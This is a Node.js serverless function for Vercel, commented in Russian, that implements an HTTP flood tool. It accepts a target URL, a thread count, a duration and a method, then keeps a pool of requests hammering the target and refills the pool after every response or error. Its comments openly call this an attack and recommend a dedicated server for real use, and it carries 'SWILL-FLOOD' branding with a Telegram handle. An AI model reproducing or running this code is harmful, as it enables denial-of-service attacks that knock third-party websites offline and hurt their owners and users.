// api/flood.js
// Это серверлесс-функция для Vercel.
// Она принимает POST запросы от клиента и запускает реальную нагрузку.
// Внимание: для масштабной атаки требуется много ресурсов, это демо-версия.

const https = require('https');
const http = require('http');

module.exports = async (req, res) => {
    // CORS для запросов с клиента
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    
    if (req.method === 'OPTIONS') {
        res.status(200).end();
        return;
    }
    
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }
    
    const { target, threads, duration, method } = req.body;
    
    if (!target || !threads) {
        return res.status(400).json({ error: 'Missing parameters' });
    }
    
    // Логируем старт атаки (для отладки)
    console.log(`[SWILL] FLOOD START: ${target} with ${threads} threads`);
    
    // Немедленный ответ, чтобы не блокировать клиент (атака идёт на фоне)
    res.status(202).json({ status: 'flood_initiated', message: 'Attack is running on server' });
    
    // Запускаем "флуд" в фоне (это блокирующая операция)
    // Предупреждение: на бесплатном тарифе Vercel это быстро упадёт.
    // Для реального использования нужен dedicated сервер.
    
    const urlObj = new URL(target);
    const lib = urlObj.protocol === 'https:' ? https : http;
    const options = {
        hostname: urlObj.hostname,
        port: urlObj.port || (urlObj.protocol === 'https:' ? 443 : 80),
        path: urlObj.pathname + urlObj.search,
        method: method || 'GET',
        headers: {
            'User-Agent': 'SWILL-FLOOD/2016 (Server-Side)',
            'Connection': 'keep-alive',
            'X-Powered-By': 't.me/Swill_Way'
        }
    };
    
    // Запускаем пул запросов
    let activeRequests = 0;
    const maxWorkers = parseInt(threads);
    const startTime = Date.now();
    const durationMs = (parseInt(duration) || 30) * 1000;
    
    function makeRequest() {
        if (Date.now() - startTime > durationMs && duration > 0) {
            return; // время вышло
        }
        
        activeRequests++;
        const req = lib.request(options, (res) => {
            res.on('data', () => {}); // consume
            res.on('end', () => {
                activeRequests--;
                if (activeRequests < maxWorkers) {
                    makeRequest(); // восполняем
                }
            });
        });
        
        req.on('error', () => {
            activeRequests--;
            if (activeRequests < maxWorkers) {
                makeRequest(); // восполняем даже при ошибке
            }
        });
        
        req.end();
    }
    
    // Запускаем пул
    for (let i = 0; i < maxWorkers; i++) {
        makeRequest();
    }
    
    // Остановка по таймеру
    if (duration > 0) {
        setTimeout(() => {
            console.log('[SWILL] Flood finished by duration');
        }, durationMs);
    }
};
